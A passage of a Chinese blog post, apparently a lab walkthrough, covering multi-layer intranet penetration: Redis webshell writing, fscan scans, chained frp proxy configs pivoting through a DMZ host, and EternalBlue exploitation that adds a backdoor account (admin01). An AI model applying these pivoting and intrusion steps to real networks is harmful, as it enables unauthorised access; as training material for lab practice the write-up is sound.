+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/86-488cfa22-bb32-4739-9262-4cc621aa8ef9.png"></p>
+<p><font style="color:rgb(51, 51, 51);">4、回到登录界面，使用添加的账号密码进行登录，可以看到登录成功</font></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/37-c80538c0-0d92-4e25-afaa-e1f6e36edb5c.png"></p>
+<h4 id="拿到flag-2"><a href="#拿到flag-2" class="headerlink" title="拿到flag_2"></a>拿到flag_2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7b4b73d7e9ef1c5959efbb820de2495e&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/16-9ee96de4-d7c8-4927-af0b-a420eb6c719f.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/55-4ff81446-fc3f-43be-a583-cc33cb3e9206.png"></p>
+<p>还有一个password，不知道是ssh密码还是redis的密码，</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/66-c339afec-7284-4fae-9603-93be2b41b7a5.png"></p>
+<h4 id="redis写入webshell"><a href="#redis写入webshell" class="headerlink" title="redis写入webshell"></a>redis写入webshell</h4><p>尝试登录</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/61-b31b7aba-2149-4851-b6cd-070689b83b29.png"></p>
+<p>寻找web目录</p>
+<p>80端口进行目录扫描</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/82-fc908b44-6be6-4a09-b098-93a59fcb607d.png"></p>
+<h4 id="挂一层代理连接蚁剑"><a href="#挂一层代理连接蚁剑" class="headerlink" title="挂一层代理连接蚁剑"></a>挂一层代理连接蚁剑</h4><p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/59-a3d063f5-bc76-489b-9f8e-1d4a20bc9c72.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/85-dc8d2b45-507f-4023-9942-b94e2b90562a.png"></p>
+<h4 id="拿到flag-3"><a href="#拿到flag-3" class="headerlink" title="拿到flag_3"></a>拿到flag_3</h4><p>在根目录下 &#x2F;flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you_look_look&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/86-2df165f9-cc3e-4875-aef9-5205ca58be25.png"></p>
+<h3 id="后渗透-1"><a href="#后渗透-1" class="headerlink" title="后渗透"></a>后渗透</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>发现不存在域环境，且存在双网卡，不出网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.59.129/24</span><br><span class="line"></span><br><span class="line">192.168.37.128/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/41-54f374a7-f5d1-44dc-b07c-6e54795e6bf5.png"></p>
+<h4 id="fscan扫描-2"><a href="#fscan扫描-2" class="headerlink" title="fscan扫描"></a>fscan扫描</h4><p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/47-b36e8592-c188-427d-a4b5-865499a38e02.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 192.168.37.128/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/83-f78a8bb8-ad40-43b6-b18a-09a4fa8a3887.png"></p>
+<p>现在的代理是第一层的代理，流量可达第二层，拿下第二层的主机后可查看第三层的网络信息</p>
+<p>因为第一层的代理访问不到第三层的主机，所以现在就准备第二层代理，这样流量就可达第三层，拿下第三层主机</p>
+<h4 id="在DMZ主机上传frpc"><a href="#在DMZ主机上传frpc" class="headerlink" title="在DMZ主机上传frpc"></a>在DMZ主机上传frpc</h4><p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/52-a8284308-37d6-4191-9406-b6067761a4f1.png"></p>
+<p>配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.213.128</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.213.129</span><br><span class="line">local_port = 6000</span><br><span class="line">remote_port = 4455</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c froc.toml</span><br></pre></td></tr></table></figure>
+
+<p>这样就将和kali做好了代理，代理端口是4455，而这个local_ip和local_port是怎么回事儿呢吧，就是将本地的6000端口转发到一层代理的4455端口上，而这个6000端口将是下文要做的二层代理端口，且这个local_ip呢是和二层主机有共同C段的IP</p>
+<h4 id="在DMZ主机上传frps"><a href="#在DMZ主机上传frps" class="headerlink" title="在DMZ主机上传frps"></a>在DMZ主机上传frps</h4><p>DMZ主机是windows，上传frps.exe</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/17-e92f4485-9b96-4d63-b410-944a6ccaf7a0.png"></p>
+<p>配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindPort = 7000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frps.exe -c frps.toml</span><br></pre></td></tr></table></figure>
+
+<p>启动之后可以看到DMZ主机已经在监听7000端口了</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/18-dd38dc05-d3da-4510-883d-f17d055f97d2.png"></p>
+<h4 id="在二层主机上传frpc"><a href="#在二层主机上传frpc" class="headerlink" title="在二层主机上传frpc"></a>在二层主机上传frpc</h4><p>二层主机是Linux，上传frpc</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/99-b8ea475d-0fbe-4783-a019-8760cdd6d7da.png"></p>
+<p>配置文件</p>
+<p>server_addr填二层主机能访问到DMZ主机的IP，也就是他俩共同网段的192.168.59.0&#x2F;24的IP</p>
+<p>remotePort改为DMZ主机要代理的端口6000，就是上文提到的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.59.128</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6000</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<p>赋予执行权限，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/86-93de4cc8-7916-42c3-815d-4b73ba219f97.png"></p>
+<p>启动之后可以上帝视角看到DMZ主机的7000端口已经和二层主机连接上了，同时6000端口也开始监听了</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/08-247f1aee-9254-4ba9-bade-df4e4bbabbb1.png"></p>
+<p>上帝视角看第二层主机也是一样的，已经和DMZ主机建立了连接</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/50-bbcd1aeb-5336-4e27-8981-696c89773558.png"></p>
+<p>现在已经做好了代理，配置一下kali的全局代理，只要第一层的代理端口就行，因为我们再一层和二层直接已经做了端口转发了，现在已经能以第二层主机的身份和第三层主机进行交互了</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/85-880ede63-6eda-4b3e-8c62-ed77221af996.png"></p>
+<h2 id="三层"><a href="#三层" class="headerlink" title="三层"></a>三层</h2><h3 id="Web渗透-2"><a href="#Web渗透-2" class="headerlink" title="Web渗透"></a>Web渗透</h3><p>当前已经知道第三层主机存在永恒之蓝漏洞了，现在看能不能将kali的msf挂上代理，直接拿exp去打第三层主机，很遗憾我的msf一直报超时</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/31-5762b59d-d609-405b-a612-922973672dd7.png"></p>
+<p>不然可以试着用下边几个模块打一打</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/51-d1dcffb9-6cc5-496e-b376-828f42858d49.png"></p>
+<h3 id="后渗透-2"><a href="#后渗透-2" class="headerlink" title="后渗透"></a>后渗透</h3><h4 id="本地挂上代理"><a href="#本地挂上代理" class="headerlink" title="本地挂上代理"></a>本地挂上代理</h4><p>用Proxifier挂好第一层代理</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/78-31fff7c0-0a8e-441b-99dd-f2ae3eac3ddc.png"></p>
+<p>规则就把二层和三层的C段写进去</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/44-80fc58ea-6da9-4792-bdfd-bf674e8646e1.png"></p>
+<p>然后用ABC_123的工具来打，扫出来了永恒之蓝</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/09-27297b68-9a52-49ef-b818-37f179fe4e26.png"></p>
+<p>可以看到该工具的流量是从代理里边走的</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/09-4b8ab949-0629-49f0-99d2-928cbefbfa13.png"></p>
+<p>选择永恒之蓝</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/48-0241b4fb-fd7d-4121-8189-49b5670a8ffc.png"></p>
+<p>注入dll文件</p>
+<p>会注入一个新的用户名admin01</p>
+<p>密码是：Config123!@#</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/54-faf6b799-d6dc-4ef7-9f84-4efd6dabc989.png"></p>
+<p>可以用上帝视角看一下是否注入成功</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/55-6c61480c-982f-49e8-80f1-5bd8cb6c3283.png"></p>
+<h4 id="远程连接三层靶机"><a href="#远程连接三层靶机" class="headerlink" title="远程连接三层靶机"></a>远程连接三层靶机</h4><p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/60-8243acd0-4a04-48a6-bbe7-10e04e1101d3.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/70-5cfd02f1-efc1-43c7-8c5d-ff1d0ca05632.png"></p>
+<h4 id="拿到flag-4"><a href="#拿到flag-4" class="headerlink" title="拿到flag_4"></a>拿到flag_4</h4><p>来到pro用户的桌面</p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/17-ae9a7fec-3a99-42a3-8095-84226de0b8ac.png"></p>
+<p><img src="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/65-e6602c73-70c5-4e9e-bbc0-4ece7c5344ae.png"></p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/127348900">【漏洞复现-dedecms-文件上传】vulfocus&#x2F;dedecms-cve_2019_8933_dedecms 漏洞-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/263845.html">Alibaba Nacos权限认证绕过漏洞复现 - FreeBuf网络安全行业门户</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">suhaynn</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/01/30/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91%E5%B7%9E%E5%BC%9F%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%8F%8A%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/">http://example.com/2025/01/30/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91%E5%B7%9E%E5%BC%9F%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%8F%8A%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">suhaynn</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91/">三层内网</a><a class="post-meta__tags" href="/tags/%E5%A4%9A%E5%B1%82%E4%BB%A3%E7%90%86/">多层代理</a></div><div class="post-share"><div class="social-share" data-image="http://q1.qlogo.cn/g?b=qq&amp;nk=1541524907&amp;s=640" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/" title="【复现】ZeroLogon漏洞CVE-2020-1472"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">【复现】ZeroLogon漏洞CVE-2020-1472</div></div><div class="info-2"><div class="info-item-1">先知Zerologon(CVE-2020-1472)是Netlogon远程协议的一个特权提升漏洞，可以在不提供任何凭据的情况下通过身份验证，并实现域内提权。 该漏洞的最常见的利用方法是调用Netlogon中的RPC函数NetrServerPasswordSet2来重置域控的机器账户的密码，从而以域控制器的机器账户的身份进行Dcsync获取域管权限。 注意，这里重置的是域控机器账户的密码，与域管的密码无关**，**该密码由系统随机生成，密码强度是 120个字符，并且会定时更新。 机器账户是不允许登录的，所以不能直接通过重置后的机器账户来登陆域控制器。但是，域控制器的机器账户在默认情况下拥有DCSync 权限，因此可以通过 DCSync攻击导出域管理员甚至所有用户密码的哈希值，进而获取域控权限 这个漏洞完整的利用，需要域控开启 135 和 445 端口。 漏洞影响版本• Windows Server 2008 R2 for x64-based Systems Service Pack 1 • Windows Server 2008 R2 for x64-based Systems...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="http://q1.qlogo.cn/g?b=qq&amp;nk=1541524907&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">suhaynn</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/suhaynn"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">我是菜狗还在玩命加载中，还有，暖男排狗后边！！！！！！！！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">靶场搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E8%A6%81%E6%B1%82"><span class="toc-number">1.2.</span> <span class="toc-text">任务要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B9%E5%8A%A8"><span class="toc-number">1.3.</span> <span class="toc-text">改动</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-number">2.</span> <span class="toc-text">靶场实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DMZ"><span class="toc-number">2.1.</span> <span class="toc-text">DMZ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F"><span class="toc-number">2.1.1.</span> <span class="toc-text">Web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fscan%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">fscan扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GetShell"><span class="toc-number">2.1.1.4.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0flag-1"><span class="toc-number">2.1.1.5.</span> <span class="toc-text">拿到flag_1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.1.2.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fscan%E6%89%AB%E6%8F%8F-1"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">fscan扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFCS"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">上线CS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">代理隧道</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E5%B1%82"><span class="toc-number">2.2.</span> <span class="toc-text">二层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0flag-2"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">拿到flag_2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#redis%E5%86%99%E5%85%A5webshell"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">redis写入webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%82%E4%B8%80%E5%B1%82%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">挂一层代理连接蚁剑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0flag-3"><span class="toc-number">2.2.1.4.</span> <span class="toc-text">拿到flag_3</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fscan%E6%89%AB%E6%8F%8F-2"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">fscan扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8DMZ%E4%B8%BB%E6%9C%BA%E4%B8%8A%E4%BC%A0frpc"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">在DMZ主机上传frpc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8DMZ%E4%B8%BB%E6%9C%BA%E4%B8%8A%E4%BC%A0frps"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">在DMZ主机上传frps</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E4%BA%8C%E5%B1%82%E4%B8%BB%E6%9C%BA%E4%B8%8A%E4%BC%A0frpc"><span class="toc-number">2.2.2.5.</span> <span class="toc-text">在二层主机上传frpc</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%B1%82"><span class="toc-number">2.3.</span> <span class="toc-text">三层</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">Web渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F-2"><span class="toc-number">2.3.2.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8C%82%E4%B8%8A%E4%BB%A3%E7%90%86"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">本地挂上代理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">远程连接三层靶机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0flag-4"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">拿到flag_4</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/30/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91%E5%B7%9E%E5%BC%9F%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%8F%8A%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/" title="【复现】州弟三层网络渗透及综合渗透">【复现】州弟三层网络渗透及综合渗透</a><time datetime="2025-01-29T16:00:00.000Z" title="发表于 2025-01-30 00:00:00">2025-01-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/26/%E3%80%90%E5%A4%8D%E7%8E%B0%E3%80%91ZeroLogon%E6%BC%8F%E6%B4%9ECVE-2020-1472/" title="【复现】ZeroLogon漏洞CVE-2020-1472">【复现】ZeroLogon漏洞CVE-2020-1472</a><time datetime="2025-01-26T13:55:37.920Z" title="发表于 2025-01-26 21:55:37">2025-01-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025 By suhaynn</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
